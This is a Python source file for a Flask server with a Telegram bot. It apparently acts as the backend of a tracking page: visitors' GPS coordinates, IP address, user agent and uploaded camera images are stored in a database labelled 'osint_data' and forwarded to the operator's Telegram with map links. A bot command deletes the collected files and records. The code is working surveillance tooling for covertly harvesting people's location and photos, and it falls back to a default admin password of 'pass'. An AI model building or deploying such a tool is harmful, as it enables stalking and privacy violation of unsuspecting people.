from flask import Flask, request, jsonify, send_file, abort
from flask_httpauth import HTTPBasicAuth
import sqlite3
from datetime import datetime
import os
import asyncio
import threading
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update
import requests
from os import environ as env
from dotenv import load_dotenv

# -------------------- Flask Setup --------------------
app = Flask(__name__)
auth = HTTPBasicAuth()
load_dotenv() 

# -------------------- Configuration --------------------
TELEGRAM_BOT_TOKEN = env.get('TELEGRAM_BOT_TOKEN')
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("Telegram bot token not found in environment variables")

AUTHORIZED_KEY = env.get('AUTHORIZED_KEY')
if not AUTHORIZED_KEY:
    raise ValueError("AUTHORIZED KEY NOT FOUND")

users = {
    env.get('ADMIN_USER', 'admin'): env.get('ADMIN_PASSWORD', 'pass')
}

# -------------------- Path Setup --------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATIC_DIR = os.path.join(BASE_DIR, 'static')
SAVE_FOLDER = os.path.join(BASE_DIR, 'saved_files')
os.makedirs(SAVE_FOLDER, exist_ok=True)
os.makedirs(STATIC_DIR, exist_ok=True)

# -------------------- Database Setup --------------------
def init_db():
    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS osint_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  type TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  file_path TEXT)''')
    conn.commit()
    conn.close()

init_db()

# -------------------- Telegram Bot Functions --------------------
authenticated_users = set()

def send_telegram_message(message):
    for user_id in authenticated_users:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": user_id, "text": message, "parse_mode": "Markdown"}
        requests.post(url, data=data)

def send_telegram_image(image_path, caption=""):
    for user_id in authenticated_users:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(image_path, "rb") as photo:
            files = {"photo": photo}
            data = {"chat_id": user_id, "caption": caption}
            requests.post(url, files=files, data=data)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
        return
    await update.message.reply_text("✅ Server is live!")

async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /auth <key>")
        return
    if context.args[0] == AUTHORIZED_KEY:
        authenticated_users.add(user_id)
        await update.message.reply_text("🔑 Authenticated successfully!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 You are not authenticated.")
        return

    deleted_files = 0
    for file in os.listdir(SAVE_FOLDER):
        file_path = os.path.join(SAVE_FOLDER, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
            deleted_files += 1

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("DELETE FROM osint_data")
    conn.commit()
    conn.close()

    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")

def run_bot():
    """Run the Telegram bot in the main thread"""
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("auth", auth))
    app.add_handler(CommandHandler("chatid", chatid))
    app.add_handler(CommandHandler("delete", delete))
    app.run_polling()

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    index_path = os.path.join(STATIC_DIR, 'index.html')
    if not os.path.exists(index_path):
        abort(404, description="Index file not found")
    return send_file(index_path)

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("""INSERT INTO osint_data
                 (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
              ("location", data['latitude'], data['longitude'], data['accuracy'],
               datetime.utcnow().isoformat(), ip_address, user_agent))
    conn.commit()
    conn.close()

    msg = (
        "📍 *New Location Received:*\n"
        f"Latitude: `{data['latitude']}`\n"
        f"Longitude: `{data['longitude']}`\n"
        f"Accuracy: ±{data['accuracy']} m\n"
        f"[📍 View on Map](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
        f"IP: `{ip_address}`\n"
        f"UA: `{user_agent}`"
    )
    send_telegram_message(msg)

    return jsonify({"status": "OK"}), 200

@app.route('/upload_image', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return jsonify({"error": "No image uploaded"}), 400

    image_file = request.files['image']
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
    image_file.save(filename)

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("""INSERT INTO osint_data (type, file_path, timestamp)
                 VALUES (?, ?, ?)""",
              ("image", filename, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    send_telegram_image(filename, caption="🖼️ New Image Uploaded")

    return jsonify({"status": "OK"}), 200

# -------------------- Main Execution --------------------
if __name__ == '__main__':
    # Start Flask app in a separate thread
    flask_thread = threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    )
    flask_thread.daemon = True
    flask_thread.start()

    # Run Telegram bot in main thread
    run_bot()